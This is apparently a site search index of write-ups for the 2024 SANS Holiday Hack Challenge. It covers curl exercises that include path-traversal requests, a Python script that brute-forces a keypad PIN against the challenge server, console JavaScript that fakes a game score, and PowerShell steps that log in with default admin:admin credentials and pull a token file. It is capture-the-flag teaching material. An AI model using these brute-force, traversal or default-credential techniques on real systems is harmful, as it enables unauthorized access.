var relearn_searchindex = [
  {
    "breadcrumb": "HHC 2024 \u003e Act2",
    "content": "Hints Mobile Analysis Easy - Tools\nFrom Objective Description Eve Snowshoes Mobile Analysis Try using apktool or jadx Mobile Analysis Easy - Missing\nFrom Objective Description Eve Snowshoes Mobile Analysis Maybe look for what names are included and work back from that? Mobile Analysis Hard - Format\nFrom Objective Description Eve Snowshoes Mobile Analysis So yeah, have you heard about this new Android app format? Want to convert it to an APK file? Mobile Analysis Hard - Encryption and Obfuscation\nFrom Objective Description Eve Snowshoes Mobile Analysis Obfuscated and encrypted? Hmph. Shame you can’t just run strings on the file. Eve Snowshoes conversation\nHi there, tech saviour! Eve Snowshoes and Team Alabaster in need of assistance. I’ve been busy creating and testing a modern solution to Santa’s Naughty-Nice List, and I even built an Android app to streamline things for Alabaster’s team. But here’s my tiny reindeer-sized problem: I made a debug version and a release version of the app. I accidentally left out a child’s name on each version, but for the life of me, I can’t remember who! Could you start with the debug version first, figure out which child’s name isn’t shown in the list within the app, then we can move on to release? I’d be eternally grateful!\nFor clarity, I have included the links from Eve Snowshoes in cleartext here:\nhttps://www.holidayhackchallenge.com/2024/SantaSwipe.apk https://www.holidayhackchallenge.com/2024/SantaSwipeSecure.aab Solution Silver Gold",
    "description": "Hints Mobile Analysis Easy - Tools\nFrom Objective Description Eve Snowshoes Mobile Analysis Try using apktool or jadx Mobile Analysis Easy - Missing\nFrom Objective Description Eve Snowshoes Mobile Analysis Maybe look for what names are included and work back from that? Mobile Analysis Hard - Format\nFrom Objective Description Eve Snowshoes Mobile Analysis So yeah, have you heard about this new Android app format? Want to convert it to an APK file?",
    "tags": [],
    "title": "Mobile Analysis",
    "uri": "/act2/mobile-analysis/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act1",
    "content": "Objective Team up with Bow Ninecandle to send web requests from the command line using Curl, learning how to interact directly with web servers and retrieve information like a pro!\nSolution Easy mode Assignment 1 Unlike the defined standards of a curling sheet, embedded devices often have web servers on non-standard ports. Use curl to retrieve the web page on host “curlingfun” port 8080. If you need help, run the ‘hint’ command. curl http:/curlingfun:8080 Assignment 2 Embedded devices often use self-signed certificates, where your browser will not trust the certificate presented. Use curl to retrieve the TLS-protected web page at https://curlingfun:9090/ curl --insecure https://curlingfun:9090 Assignment 3 Working with APIs and embedded devices often requires making HTTP POST requests. Use curl to send a request to https://curlingfun:9090/ with the parameter “skip” set to the value “alabaster”, declaring Alabaster as the team captain. curl --insecure https://curlingfun:9090 -X POST -d \"skip=alabaster\" Assignment 4 Working with APIs and embedded devices often requires maintaining session state by passing a cookie. Use curl to send a request to https://curlingfun:9090/ with a cookie called “end” with the value “3”, indicating we’re on the third end of the curling match. curl --insecure --cookie \"end=3\" https://curlingfun:9090/ Assignment 5 Working with APIs and embedded devices sometimes requires working with raw HTTP headers. Use curl to view the HTTP headers returned by a request to https://curlingfun:9090/ curl --insecure --head https://curlingfun:9090/ Assignment 6 Working with APIs and embedded devices sometimes requires working with custom HTTP headers. Use curl to send a request to https://curlingfun:9090/ with an HTTP header called “Stone” and the value “Granite”. curl --insecure --header \"Stone: Granite\" https://curlingfun:9090/ Assignment 7 curl will modify your URL unless you tell it not to. For example, use curl to retrieve the following URL containing special characters: https://curlingfun:9090/../../etc/hacks curl --insecure --path-as-is \"https://curlingfun:9090/../../etc/hacks\" Last assignment Hard mode Hard mode hints and assignment is placed in a text file (HARD-MODE.txt) on disk:\nls HARD-MODE.txt HELP Assignment 1 Content is of HARD-MODE.txt is:\nPrefer to skip ahead without guidance? Use curl to craft a request meeting these requirements:\nHTTP POST request to https://curlingfun:9090/ Parameter “skip” set to “bow” Cookie “end” set to “10” Header “Hack” set to “12ft” Command to solve this assignment:\ncurl --insecure https://curlingfun:9090/ -X POST -d \"skip=bow\" --cookie \"end=10\" --header \"Hack: 12ft\" Assignment 2 Excellent! Now, use curl to access this URL: https://curlingfun:9090/../../etc/button\nCommand to solve this assignment:\ncurl --insecure https://curlingfun:9090/../../etc/button -X POST -d \"skip=bow\" --cookie \"end=10\" --header \"Hack: 12ft\" --path-as-is Assignment 3 Command to solve this assignment:\ncurl --insecure https://curlingfun:9090/GoodSportsmanship -X POST -d \"skip=bow\" --cookie \"end=10\" --header \"Hack: 12ft\" --path-as-is -L",
    "description": "Objective Team up with Bow Ninecandle to send web requests from the command line using Curl, learning how to interact directly with web servers and retrieve information like a pro!\nSolution Easy mode Assignment 1 Unlike the defined standards of a curling sheet, embedded devices often have web servers on non-standard ports. Use curl to retrieve the web page on host “curlingfun” port 8080. If you need help, run the ‘hint’ command.",
    "tags": [],
    "title": "Curling",
    "uri": "/act1/curling/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "Welcome back to the Geese Islands! Let’s help the elves pack up to return to the North Pole.\nTalk to Jingle, Angel, and Poinsettia about their challenges.\nThis is a new chapter at the Frosty Beach\nJingle Ringford (Frosty’s Beach)\nWelcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge!\nI’m Jingle Ringford, one of Santa’s many elves.\n…\nJust kidding! It’s actually the 2024 SANS Holiday Hack Challenge!\nAnd although we’re on Frosty’s Beach on Christmas Island, we’ll soon be on our way back to the North Pole.\nI thought it best to wait here for people that heard we’re on the Geese Islands but may not know we’re leaving.\nI haven’t seen Santa since we started packing up, but he always asks me to give a quick orientation to newcomers, so I’m continuing the tradition.\nBefore you head out any further onto the island, you need to accomplish two simple tasks.\nBut first, here’s a parting gift. I packed this snowball made of the magical, never-melting snow of Christmas Island. A little souvenir to take with you when we leave for the North Pole.\nClick on the snowball on your avatar. That’s where you will see your Objectives, Hints, resource links, and Conversations for the Holiday Hack Challenge.\nNow, click on the Cranberry Pi Terminal and follow the on-screen instructions.",
    "description": "Welcome back to the Geese Islands! Let’s help the elves pack up to return to the North Pole.\nTalk to Jingle, Angel, and Poinsettia about their challenges.\nThis is a new chapter at the Frosty Beach\nJingle Ringford (Frosty’s Beach)\nWelcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge!\nI’m Jingle Ringford, one of Santa’s many elves.\n…\nJust kidding! It’s actually the 2024 SANS Holiday Hack Challenge!",
    "tags": [],
    "title": "Prologue",
    "uri": "/prologue/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Prologue",
    "content": "Objective Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands\nQuestion Answer",
    "description": "Objective Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands\nQuestion Answer",
    "tags": [],
    "title": "Orientation Challenge",
    "uri": "/prologue/orientation-challenge/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act2",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Drone Path",
    "uri": "/act2/drone-path/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "This is a new chapter at the Front Yard.\nWith Santa away, Wombley Cube and Alabaster Snowball have each tried to lead. Surely they won’t mess up the naughty and nice list…\nHelp Bow, Morcel, and Jewell solve their challenges.",
    "description": "This is a new chapter at the Front Yard.\nWith Santa away, Wombley Cube and Alabaster Snowball have each tried to lead. Surely they won’t mess up the naughty and nice list…\nHelp Bow, Morcel, and Jewell solve their challenges.",
    "tags": [],
    "title": "Act1",
    "uri": "/act1/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act1",
    "content": "Objective In a swirl of shredded paper, lies the key. Can you unlock the shredder’s code and uncover Santa’s lost secrets?\nHints UV light Numbers found from lighting at the keypad using the UV light:\n[ 2, 6, 7, 8 ] Hint from the book This is the hint we get:\nThinking about it, it appears to correpond to\npage:word:letter Using this formula I got:\nSequence From book 2:6:1 S 4:19:3 A 6:1:1 N 3:10:4 T 14:8:3 A Somehow I got “SANTA”. After much thoughtwork I came up with a scheme on how I can use this word - let’s look at it with some Regex filter spectacles:\nPosition Letter Pattern 1 S Pos 1 should not be same as pos. 5 2 A Pos 2 should be the same as pos. 5 3 N Pos 3 should not be the same as pos, 1, 2, 4, 5 4 T Pos 4 should not be the same as post 1, 2, 3, 5 5 A Pos 5 should be the same as pos. 2 Solution Silver solution Bruteforcer Given the filter outlined under “Hint from the book”, I created the following Python script to calcualte permutations and apply the filter scheme. I picked up the the remote URL and POST format from a BurpSuite session. The script:\nimport requests, itertools, time for perm in [''.join(p) for p in itertools.product(['2', '6', '7', '8'], repeat=5)]: if perm[0] is not perm[-1] and perm[1] == perm[-1]: if (perm[0] not in list(set(perm[2:4]))) and (perm[1] not in list(set(perm[2:4]))) and len(list(set(perm[2:4]))) \u003e 1: res = requests.post( \"https://hhc24-frostykeypad.holidayhackchallenge.com/submit\", json = { \"answer\": perm } ) if res.status_code != 400: print(perm) break else: time.sleep(1) After just a couple of seconds, it produced the correct pin code:\n72682 As evident here, the pincode got accepted:\nGold solution There’s a second pincode to be found that doesn’t fit the tips already given. Time to modify the above script and bruteforce the solution:\nimport requests, itertools, time for perm in [''.join(p) for p in itertools.product(['2', '6', '7', '8'], repeat=5)]: print(f\"trying '{perm}' ... \", end=\"\") res = requests.post( \"https://hhc24-frostykeypad.holidayhackchallenge.com/submit\", json = { \"answer\": perm } ) if res.status_code != 400: print(f\"{res.status_code} - {res.json()} - {perm}\") else: print(\" Negative\") time.sleep(1) This script found the other pincode within seconds: 22786",
    "description": "Objective In a swirl of shredded paper, lies the key. Can you unlock the shredder’s code and uncover Santa’s lost secrets?\nHints UV light Numbers found from lighting at the keypad using the UV light:\n[ 2, 6, 7, 8 ] Hint from the book This is the hint we get:\nThinking about it, it appears to correpond to\npage:word:letter Using this formula I got:\nSequence From book 2:6:1 S 4:19:3 A 6:1:1 N 3:10:4 T 14:8:3 A Somehow I got “SANTA”.",
    "tags": [],
    "title": "Frosty Keypad",
    "uri": "/act1/frosty-keypad/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Prologue",
    "content": "Objective Help Angel Candysalt connect the dots in a game of connections.\nObservations # Observation 1 Inspected network traffic, game is hosted at https://hhc24-elfconnect.holidayhackchallenge.com/ 2 Playing game through Burpsuite we can get hold of the Javascript controlling the game 3 In Javascript, variable “wordSets” holds the words 4 In Javascript, variable “correctSets” holds the correct words for each round 5 Round is controlled by https://hhc24-elfconnect.holidayhackchallenge.com/?round=2 6 It appears that “correctSets” isn’t updated between rounds. Thus, the same positions pr. set is reused. 7 In Javascript, if we set variable “score” to a high number, it reflects in the GUI. 8 We need to set “id” in local storage to beat this game if we load the game in a new window or tab, as evident in code localStorage.getItem('id'); Solution Based on the observation, this appears to be a straight and easy task to solve. Since we found the Javascript controlling the game, and observing what it does, we can create a short and sweet Javascript that simply loops through each sets in wordSets and maps it to the corresponding solution in correctSets. We also make sure to bump the topscore by simply setting it to a huge number to beat this game with gold.\nfunction mapWordsByCorrectSets(wordSets, correctSets) { let result = {}; for (let setKey in wordSets) { result[setKey] = correctSets.map(indices =\u003e indices.map(i =\u003e wordSets[setKey][i]) ); } return result; } score = 10000000000000; console.log(mapWordsByCorrectSets(wordSets, correctSets)); Applying code Selecting the right iframe we are going to work in:\nPasting and running the Javascript code:\nThen it is just a matter of selecting the first word set from the GUI and you have beaten the game with a new high score!\nJavascript controlling the game let urlParams = new URLSearchParams(window.location.search); const roundCheck = urlParams.get('round'); if (!roundCheck) { // If 'round' is absent or has no value sessionStorage.clear(); } // Configuring the Phaser game const config = { type: Phaser.AUTO, scale: { // sets the auto scaling of the canvas for all browsers mode: Phaser.Scale.FIT, parent: 'phaser-example', autoCenter: Phaser.Scale.CENTER_BOTH, width: 800, height: 600 }, backgroundColor: '#2fb3fe', // background border color scene: { preload: preload, create: create, update: update }, physics: { default: 'arcade', //defines game as an arcade type arcade: { gravity: { y: 0 }, debug: false } } }; const game = new Phaser.Game(config); const wordSets = { 1: [\"Tinsel\", \"Sleigh\", \"Belafonte\", \"Bag\", \"Comet\", \"Garland\", \"Jingle Bells\", \"Mittens\", \"Vixen\", \"Gifts\", \"Star\", \"Crosby\", \"White Christmas\", \"Prancer\", \"Lights\", \"Blitzen\"], 2: [\"Nmap\", \"burp\", \"Frida\", \"OWASP Zap\", \"Metasploit\", \"netcat\", \"Cycript\", \"Nikto\", \"Cobalt Strike\", \"wfuzz\", \"Wireshark\", \"AppMon\", \"apktool\", \"HAVOC\", \"Nessus\", \"Empire\"], 3: [\"AES\", \"WEP\", \"Symmetric\", \"WPA2\", \"Caesar\", \"RSA\", \"Asymmetric\", \"TKIP\", \"One-time Pad\", \"LEAP\", \"Blowfish\", \"hash\", \"hybrid\", \"Ottendorf\", \"3DES\", \"Scytale\"], 4: [\"IGMP\", \"TLS\", \"Ethernet\", \"SSL\", \"HTTP\", \"IPX\", \"PPP\", \"IPSec\", \"FTP\", \"SSH\", \"IP\", \"IEEE 802.11\", \"ARP\", \"SMTP\", \"ICMP\", \"DNS\"] }; let wordBoxes = []; let selectedBoxes = []; let correctSets = [ [0, 5, 10, 14], // Set 1 [1, 3, 7, 9], // Set 2 [2, 6, 11, 12], // Set 3 [4, 8, 13, 15] // Set 4 ]; let completedSets = []; let shuffledIndices = []; let emitter; let successText; let successBackground; let mainScene; let score = parseInt(sessionStorage.getItem('score') || '0'); // Initialize score let scoreText; // Text object for score display let highScore = 50000; let highScoreText; // text object for high score let roundComplete = sessionStorage.getItem('roundComplete'); if (roundComplete == null) { roundComplete = 0; } // let urlParams = new URLSearchParams(window.location.search); let round = parseInt(urlParams.get('round') ?? 1, 10); // Default to round 1 if no parameter is set let words = wordSets[round]; document.addEventListener(\"DOMContentLoaded\", function() { setTimeout(function() { const urlParams = new URLSearchParams(window.location.search); const id = urlParams.get('id'); // Regular expression to validate a UUID v4 const uuidV4Regex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i; // Check if the id parameter exists and is a valid UUID v4 if (id \u0026\u0026 uuidV4Regex.test(id)) { localStorage.setItem('id', id); } else { let id = localStorage.getItem('id'); if (!id) { alert('Invalid id provided in the URL. Please provide a valid ID in order to get completion if you beat this challenge.'); } } if (!round) { urlParams.set('round', roundComplete++); window.location.href = `${window.location.origin}${window.location.pathname}?${urlParams.toString()}`; } }, 250); }); const gridCols = 4; const gridRows = 4; const boxWidth = 180; const boxHeight = 120; const gridXOffset = 50; const gridYOffset = 50; function preload() { this.load.image('flares', \"/static/images/candyCane.png\"); this.load.image('overlay', \"/static/images/background.webp\"); this.load.image('landing', \"/static/images/landing.png\"); this.load.audio('bzzzt', '/static/audio/bzzzt.wav'); //this.sound.play('bzzzt'); this.load.audio('click', '/static/audio/click.wav'); //this.sound.play('click'); this.load.audio('ding', '/static/audio/ding.wav'); //this.sound.play('ding'); this.load.audio('horaay', '/static/audio/horaay.wav'); //this.sound.play('horaay'); console.log(\"Static files loaded\"); } function create() { //console.log('round ' + roundComplete); //console.log('score ' + score); mainScene = this; var overlay = this.add.image(400, 300, 'overlay').setDepth(0).setOrigin(0.5, 0.5); overlay.setScale(0.5); // Add title text (centered horizontally and aligned with the score's y-position) titleText = this.add.text(400, 15, 'Elf Connect', { fontSize: '30px', fill: '#000', // Black color for the title align: 'center' }); titleText.setOrigin(0.5, 0); // Center the title horizontally on the x-axis if (roundComplete == 0) { var landing = this.add.image(400, 250, 'landing').setScale(.6).setDepth(2).setOrigin(0.5, 0.5).setInteractive(); mainScene.input.once('pointerdown', function () { landing.destroy(); }) } shuffledIndices = Phaser.Utils.Array.Shuffle([...Array(16).keys()]); for (let i = 0; i \u003c 16; i++) { let col = i % gridCols; let row = Math.floor(i / gridCols); let xPos = gridXOffset + col * boxWidth; let yPos = gridYOffset + row * boxHeight; let box = this.add.text(xPos, yPos, words[shuffledIndices[i]], { fontSize: '20px', //backgroundColor: '#0a7e28', // card color unselected backgroundColor: '#10ca40', // card color unselected color: '#000000', //text color for cards padding: { top: 20, left: 10, right: 10, bottom: 20 }, align: 'center', fixedWidth: boxWidth - 20, fixedHeight: boxHeight - 20, wordWrap: { width: boxWidth - 40, useAdvancedWrap: true } }).setInteractive(); box.index = shuffledIndices[i]; box.selected = false; box.gridPos = i; box.on('pointerdown', function () { if (!this.selected) { this.setStyle({ backgroundColor: '#edbb99' }); // card color selected this.selected = true; selectedBoxes.push(this); } else { //this.setStyle({ backgroundColor: '#0a7e28' }); // card color unselected this.setStyle({ backgroundColor: '#10ca40' }); // card color unselected this.selected = false; selectedBoxes = selectedBoxes.filter(box =\u003e box !== this); } if (selectedBoxes.length === 4) { checkSelectedSet(this.scene); } else { mainScene.sound.play('click'); } }); wordBoxes.push(box); } emitter = this.add.particles(400, 250, 'flares', { lifespan: 4000, speed: { min: 150, max: 250 }, scale: { start: 0.8, end: 0 }, gravityY: 150, blendMode: 'ADD', emitting: false }); // Add scoreboard text scoreText = this.add.text(600, 20, 'Score: ' + score, { fontSize: '20px', fill: '#000000' }); highScoreText = this.add.text(20, 20, 'High Score: 50000', { fontSize: '20px', fill: '#000' }); } function update() { // Nothing needed in the update loop for this simple game } function checkSelectedSet(scene) { let selectedIndices = selectedBoxes.map(box =\u003e box.index); selectedIndices.sort((a, b) =\u003e a - b); let isCorrectSet = false; let matchedSetIndex = -1; for (let i = 0; i \u003c correctSets.length; i++) { if (JSON.stringify(selectedIndices) === JSON.stringify(correctSets[i])) { isCorrectSet = true; matchedSetIndex = i; break; } } if (isCorrectSet) { completedSets.push(matchedSetIndex); positionCompletedSets(); disableCompletedSet(matchedSetIndex); // Disable interaction on the completed set shuffleRemainingRows(); // Update score by 100 points score += 100; scoreText.setText('Score: ' + score); // Add high-score board if (score \u003e 50000) { highScoreText.setText('High Score: ' + score); emitter.explode(20); submitAction(2); displaySuccessMessage('Great Job Hacker! Elf Connect Complete and Hacked!', function () { }); } // If all sets are completed, trigger the fireworks effect if (completedSets.length === 4) { roundComplete++; scene.sound.play('horaay'); gameStatus(); } else { scene.sound.play('ding'); } } else { selectedBoxes.forEach(box =\u003e { //box.setStyle({ backgroundColor: '#0a7e28' }); // card color unselected original box.setStyle({ backgroundColor: '#10ca40' }); // card color unselected box.selected = false; }); scene.sound.play('bzzzt'); } selectedBoxes = []; } function disableCompletedSet(setIndex) { correctSets[setIndex].forEach((wordIndex) =\u003e { let box = wordBoxes.find(box =\u003e box.index === wordIndex); if (box) { box.disableInteractive(); // Disable interaction on the box } }); } function positionCompletedSets() { completedSets.forEach((setIndex, completedRowIndex) =\u003e { let yPos = gridYOffset + completedRowIndex * boxHeight; correctSets[setIndex].forEach((wordIndex, boxIndex) =\u003e { let box = wordBoxes.find(box =\u003e box.index === wordIndex); let xPos = gridXOffset + boxIndex * boxWidth; box.setStyle({ backgroundColor: '#126079', // completed row color color: '#fff' //text color completed row cards }); box.setPosition(xPos, yPos); }); }); } function shuffleRemainingRows() { let remainingBoxes = wordBoxes.filter(box =\u003e !completedSets.includes(correctSets.findIndex(set =\u003e set.includes(box.index)))); let shuffledIndices = Phaser.Utils.Array.Shuffle(remainingBoxes.map(box =\u003e box.index)); remainingBoxes.forEach((box, i) =\u003e { let remainingRowIndex = Math.floor(i / gridCols) + completedSets.length; let colIndex = i % gridCols; let xPos = gridXOffset + colIndex * boxWidth; let yPos = gridYOffset + remainingRowIndex * boxHeight; box.index = shuffledIndices[i]; box.setText(words[shuffledIndices[i]]); box.setPosition(xPos, yPos); //box.setStyle({ backgroundColor: '#0a7e28' }); // unselected card color box.setStyle({ backgroundColor: '#10ca40' }); // unselected card color }); } function gameStatus() { //console.log(roundComplete); if (roundComplete \u003c 4) { emitter.explode(20); displaySuccessMessage('Round ' + roundComplete + ' Completed', function () { this.sessionStorage.setItem('score', score); this.sessionStorage.setItem('roundComplete', roundComplete); window.location.href = `${window.location.origin}${window.location.pathname}?round=${roundComplete + 1}`; }); } else { emitter.explode(20); submitAction(1); displaySuccessMessage.call(this, 'Success! You have defeated the Elf Connect!!!!'); } } async function submitAction(answer) { //const urlParams = new URLSearchParams(window.location.search); //const id = urlParams.get('id'); //localStorage.setItem('id', id); let id = localStorage.getItem('id'); if (!id) { alert('No ID found in localstorage so we could not submit your results'); } const url = `/submit?id=${id}`; const data = { answer: answer }; // Send the answer as a JSON object //Original //const url = '/submit'; //const data = { answer: answer }; try { const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); if (response.ok) { const result = await response.json(); console.log('Success:', result); return true; } else { console.error('Error:', response.statusText); } } catch (error) { console.error('Error:', error); } } function displaySuccessMessage(message, callback) { if (successText) { successText.destroy(); } if (successBackground) { successBackground.destroy(); } const padding = 10; const textStyle = { fontSize: '24px', fill: '#00FF00', align: 'center' }; successText = mainScene.add.text(mainScene.cameras.main.centerX, mainScene.cameras.main.centerY, message, textStyle); successText.setOrigin(0.5, 0.5); const textWidth = successText.width + 2 * padding; const textHeight = successText.height + 2 * padding; successBackground = mainScene.add.graphics(); successBackground.fillStyle(0x000000, 0.8); successBackground.fillRect( mainScene.cameras.main.centerX - textWidth / 2, mainScene.cameras.main.centerY - textHeight / 2, textWidth, textHeight ); mainScene.children.bringToTop(successText); setTimeout(() =\u003e { if (successText) { successText.destroy(); successText = null; } if (successBackground) { successBackground.destroy(); successBackground = null; } //console.log(roundComplete) if (roundComplete != 4) { callback(); } }, 3000); }",
    "description": "Objective Help Angel Candysalt connect the dots in a game of connections.\nObservations # Observation 1 Inspected network traffic, game is hosted at https://hhc24-elfconnect.holidayhackchallenge.com/ 2 Playing game through Burpsuite we can get hold of the Javascript controlling the game 3 In Javascript, variable “wordSets” holds the words 4 In Javascript, variable “correctSets” holds the correct words for each round 5 Round is controlled by https://hhc24-elfconnect.holidayhackchallenge.com/?round=2 6 It appears that “correctSets” isn’t updated between rounds.",
    "tags": [],
    "title": "Elf Connect",
    "uri": "/prologue/elf-connect/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "This is a new chapter.",
    "description": "This is a new chapter.",
    "tags": [],
    "title": "Act2",
    "uri": "/act2/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act2",
    "content": "Silver Task 1 There is a file in the current directory called ‘welcome.txt’. Read the contents of this file Get-Content -Path \".\\welcome.txt\" Output\nSystem Overview The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel. Lockdown Protocols When the system enters lockdown mode, all access to the armory is frozen. This includes both entry to and interaction with the weaponry storage. The defense mechanisms become active, deploying logical barriers to prohibit unauthorized access. During this state, users cannot disable the system without the intervention of an authorized administrator. The system logs all access attempts and alerts central command when lockdown is triggered. Access and System Restoration To restore access to the system, users must follow strict procedures. First, authorized personnel must identify the scrambled endpoint. Next, they must deactivate the defense mechanisms by entering the override code and presenting the required token. After verification, the system will resume standard operation, and access to weaponry is reactivated. Task 2 Geez that sounds ominous, I’m sure we can get past the defense mechanisms. We should warm up our PowerShell skills. How many words are there in the file? (Get-Content -Path \".\\welcome.txt\" -Raw) -split '\\s+' | Where-Object { $_ -ne '' } | Measure-Object | Select-Object -ExpandProperty Count Output\n180 Task 3 There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on? netstat -an | Select-String 'LISTEN' Output\ntcp 0 0 127.0.0.1:1225 0.0.0.0:* LISTEN unix 2 [ ACC ] STREAM LISTENING 350156949 /tmp/CoreFxPipe_PSHos t.DB3DA5D4.143.None.pwsh unix 2 [ ACC ] STREAM LISTENING 350148184 /tmp/tmux-1050/default unix 2 [ ACC ] STREAM LISTENING 350154640 /tmp/dotnet-diagnosti c-143-25076401-socket Task 4 You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get? Invoke-WebRequest -Uri \"http://127.0.0.1:1225\" Output\nInvoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED). Task 5 It looks like defensive measures are in place, it is protected by basic authentication. Try authenticating with a standard admin username and password. Invoke-WebRequest -Uri \"http://127.0.0.1:1225\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing Output\nStatusCode : 200 StatusDescription : OK Content : \u003chtml\u003e \u003cbody\u003e \u003cpre\u003e ---------------------------------------------------- 🪖 Elf MFA webserver🪖 ⚔️ Grab your tokens for access to weaponry ⚔️ ⚔️ Warning! Sensitive information on the server, protect a… RawContent : HTTP/1.1 200 OK Server: Werkzeug/3.0.6 Server: Python/3.10.12 Date: Sat, 23 Nov 2024 13:04:34 GMT Connection: close Content-Type: text/html; charset=utf-8 Content-Length: 3475 \u003chtml\u003e \u003cbody\u003e \u003cpre\u003e ---… Headers : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Type, System.String[]]…} Images : {} InputFields : {} Links : {@{outerHTML=\u003ca href=\"http://localhost:1225/endpoints/1\"\u003eEndpoint 1\u003c/a\u003e; tagName=A; href=http://localhost:1225/endpoints/1}, @{outerHTML=\u003ca href=\"http://localhost:1225/endpoints/2\"\u003eEndpoint 2\u003c/a\u003e; tagName=A; href=htt p://localhost:1225/endpoints/2}, @{outerHTML=\u003ca href=\"http://localhost:1225/endpoints/3\"\u003eEndpoint 3\u003c/a\u003e; tagName=A; href=http://localhost:1225/endpoints/3}, @{outerHTML=\u003ca href=\"http://localhost:1225/endpoints/4\"\u003eEnd point 4\u003c/a\u003e; tagName=A; href=http://localhost:1225/endpoints/4}…} RawContentLength : 3475 RelationLink : {} Task 6 There are too many endpoints here. Use a loop to download the contents of each page. What page has 138 words? When you find it, communicate with the URL and print the contents to the terminal. # Define the base URL and credentials $baseUrl = \"http://127.0.0.1:1225\" $credentials = \"admin:admin\" $encodedAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($credentials)) # Set the headers for authorization $headers = @{ Authorization = \"Basic $encodedAuth\" } # Perform the initial web request to get the main page content $response = Invoke-WebRequest -Uri $baseUrl -Headers $headers -UseBasicParsing # Filter the links to those that match the endpoint pattern $endpointLinks = $response.Links | Where-Object { $_.href -like \"http://localhost:1225/endpoints/*\" } # Loop through each endpoint link foreach ($link in $endpointLinks) { # Request the content of the current endpoint $pageContent = Invoke-WebRequest -Uri $link.href -Headers $headers -UseBasicParsing # Split the content into words and check if it contains exactly 138 words if (($pageContent.Content -split '\\s+').Count -eq 138) { # Output the found page and its content Write-Output \"Found page with 138 words: $($link.href)\" Write-Output $pageContent.Content break # Stop searching after finding the first matching page } } Output\nFound page with 138 words: http://localhost:1225/endpoints/13 \u003chtml\u003e\u003chead\u003e\u003ctitle\u003eMFA token scrambler\u003c/title\u003e\u003c/head\u003e\u003cbody\u003e\u003cp\u003eYuletide cheer fills the air,\u003cbr\u003e A season of love, of care.\u003cbr\u003e The world is bright, full of light,\u003cbr\u003e As we celebrate this special night.\u003cbr\u003e The tree is trimmed, the stockings hung,\u003cbr\u003e Carols are sung, bells are rung.\u003cbr\u003e Families gather, friends unite,\u003cbr\u003e In the glow of the fire’s light.\u003cbr\u003e The air is filled with joy and peace,\u003cbr\u003e As worries and cares find release.\u003cbr\u003e Yuletide cheer, a gift so dear,\u003cbr\u003e Brings warmth and love to all near.\u003cbr\u003e May we carry it in our hearts,\u003cbr\u003e As the season ends, as it starts.\u003cbr\u003e Yuletide cheer, a time to share,\u003cbr\u003e The love, the joy, the care.\u003cbr\u003e May it guide us through the year,\u003cbr\u003e In every laugh, in every tear.\u003cbr\u003e Yuletide cheer, a beacon bright,\u003cbr\u003e Guides us through the winter night \u003c/p\u003e\u003cp\u003e Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv\u003c/p\u003e\u003c/body\u003e\u003c/html\u003e Task 7 There seems to be a csv file in the comments of that page. That could be valuable, read the contents of that csv-file! # Define the base URL and credentials $baseUrl = \"http://127.0.0.1:1225\" $credentials = \"admin:admin\" $encodedAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($credentials)) $headers = @{ Authorization = \"Basic $encodedAuth\" } # Perform the initial web request to get the main page content $response = Invoke-WebRequest -Uri $baseUrl -Headers $headers -UseBasicParsing # Filter the links to those that match the endpoint pattern $endpointLinks = $response.Links | Where-Object { $_.href -like \"http://localhost:1225/endpoints/*\" } # Loop through each endpoint link foreach ($link in $endpointLinks) { # Request the content of the current endpoint $pageContent = Invoke-WebRequest -Uri $link.href -Headers $headers -UseBasicParsing # Check if the content has exactly 138 words if (($pageContent.Content -split '\\s+').Count -eq 138) { # Search for a CSV URL in the content if ($pageContent.Content -match '(http[^\"]+\\.csv)') { $csvUrl = $matches[1] # Extract the CSV URL from the match # Fetch the CSV content from the extracted URL $csvContent = Invoke-WebRequest -Uri $csvUrl -Headers $headers -UseBasicParsing $csvContent.Content | Write-Output # Output the CSV content } break # Stop searching after finding the first matching page } } Output\n6ef5570cd43a3ec9f43c57f662201e55,REDACTED bf189d47c3175ada98af398669e3cac3,REDACTED 743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED 270aabd5feaaf40185f2effa9fa2cd6e,REDACTED 8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED 6fd00cbda10079b1d55283a88680d075,REDACTED 612001dd92369a7750c763963bc327f0,REDACTED 010f2cc580f74521c86215b7374eead6,REDACTED 29860c67296d808bc6506175a8cbb422,REDACTED 7b7f6891b6b6ab46fe2e85651db8205f,REDACTED 45ffb41c4e458d08a8b08beeec2b4652,REDACTED d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED bd7efda0cb3c6d15dd896755003c635c,REDACTED 5be8911ced448dbb6f0bd5a24cc36935,REDACTED 1acbfea6a2dad66eb074b17459f8c5b6,REDACTED 0f262d0003bd696550744fd43cd5b520,REDACTED 